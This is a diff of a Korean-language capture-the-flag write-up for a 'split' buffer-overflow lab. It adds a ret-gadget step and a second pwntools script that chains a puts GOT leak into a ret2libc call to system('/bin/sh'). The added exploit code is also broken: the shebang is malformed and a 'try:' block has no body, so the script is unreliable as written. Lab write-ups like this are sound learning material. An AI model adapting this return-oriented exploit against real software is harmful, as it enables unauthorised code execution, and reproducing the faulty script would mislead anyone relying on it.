@@ -41,13 +41,16 @@ pwnme의 시작 부분과 read함수 호출부분에 브레이크포인트룰 �
 
 <img width="1250" height="72" alt="image" src="https://github.com/user-attachments/assets/78556130-06af-4950-b49b-0df1bff4e2b3" />
 
+<img width="1366" height="131" alt="image" src="https://github.com/user-attachments/assets/74b6d670-5df0-4c75-91d0-c484678e464e" />
+
+ret 가젯도 찾아둔다.
+
 ### "/bin/cat flag.txt" 구하기
 
 <img width="1033" height="131" alt="image" src="https://github.com/user-attachments/assets/46cb98b3-0962-44ad-b517-1ee1aac80e15" />
 
 
 ### 익스플로잇 코드
-
 
 
 ```python
@@ -79,6 +82,64 @@ r.send(payload)
 
 r.interactive()
 ```
+
+libc 파일 가져와서 쓰는 방법으로는
+
+
+```
+#!/bin"python3
+from pwn import *
+
+# 1. 기본 설정
+e = ELF('./split')
+p = process(e.path)
+libc = ELF('./libc6.so') 
+
+pop_rdi_ret = 0x004007c3
+main_addr = e.symbols['main'] 
+ret_gadget = 0x0040053e 
+
+
+payload = b'A' * 40           
+payload += p64(pop_rdi_ret)    
+payload += p64(e.got['puts'])   
+payload += p64(e.plt['puts'])   
+payload += p64(main_addr)       
+
+p.recvuntil(b'> ')
+p.sendline(payload)
+
+
+try:
+    p.recvuntil(b'Thank you!\n')
+
+
+
+leaked_data = p.recv(6) 
+leaked_puts = u64(leaked_data.ljust(8, b'\x00'))
+log.success(f"Leaked 'puts' address: {hex(leaked_puts)}")
+
+libc_base = leaked_puts - libc.symbols['puts']
+system_addr = libc_base + libc.symbols['system']
+bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
+
+log.info(f"Libc base address: {hex(libc_base)}")
+log.info(f"Calculated 'system' address: {hex(system_addr)}")
+log.info(f"Calculated '/bin/sh' address: {hex(bin_sh_addr)}")
+
+
+payload2 = b'A' * 40
+payload2 += p64(pop_rdi_ret)
+payload2 += p64(bin_sh_addr)
+payload2 += p64(ret_gadget)     
+payload2 += p64(system_addr)
+
+p.recvuntil(b'> ')
+p.sendline(payload2)
+
+p.interactive()
+```
+
 
 <img width="557" height="58" alt="image" src="https://github.com/user-attachments/assets/d65d033f-d9c6-4422-a484-b55c217aae89" />
 
